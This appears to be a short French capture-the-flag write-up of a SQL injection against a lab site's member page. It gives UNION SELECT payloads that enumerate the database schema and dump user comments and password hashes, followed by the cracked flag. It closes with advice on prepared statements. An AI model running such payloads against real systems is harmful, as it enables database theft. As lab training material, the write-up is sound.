EXPLAIN : http://{host}/?page=member

$> true
Nous renvoie le membre id 1
Donc les requetes ne sont pas parsees

Le nom de la base de donnees
$> true union select 1, database()

Le nom des tables
$> true union select 1, table_name from information_schema.tables where table_schema=database() 

Les noms des colonnes
$> true union select table_name, column_name from information_schema.columns where table_schema=database()

+-------------+
|    users    |
+-------------+
| user_id     |
| first_name  |
| last_name   |
| town        |
| country     |
| planet      |
| Commentaire |
| countersign |
+-------------+

Le contenu
true union select commentaire, countersign from users
| 	Decrypt this password -> then lower all the char. Sh256 on it and it's good !
| 	5ff9d0165b4f92b14994e5c685cdce28
FortyTwo -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5


AVOID
+ Verifier le parametre envoye. En php, is_numeric()
+ Utiliser des requetes preparees 
<?php
	$stmt = $db->prepare("SELECT * FROM users where user_id = ?");
	$stmt->execute([$_GET['id']]);
?>
Ainsi si on met "true", la requete cherchera literalement un id "true", qui n'existe pas. 
